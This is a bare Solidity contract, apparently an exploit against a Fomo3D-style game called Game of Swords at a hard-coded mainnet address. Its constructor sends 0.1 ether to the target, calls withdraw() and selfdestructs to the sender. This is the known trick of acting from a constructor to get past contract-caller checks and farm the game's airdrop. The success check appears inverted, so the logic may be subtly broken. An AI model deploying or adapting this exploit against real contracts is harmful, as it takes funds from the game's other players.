contract AirDropWinner {
     GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);
    constructor() public {
        if(!address(fomo3d).call.value(0.1 ether)()) {
           fomo3d.withdraw();
           selfdestruct(msg.sender);
        }
    }
}
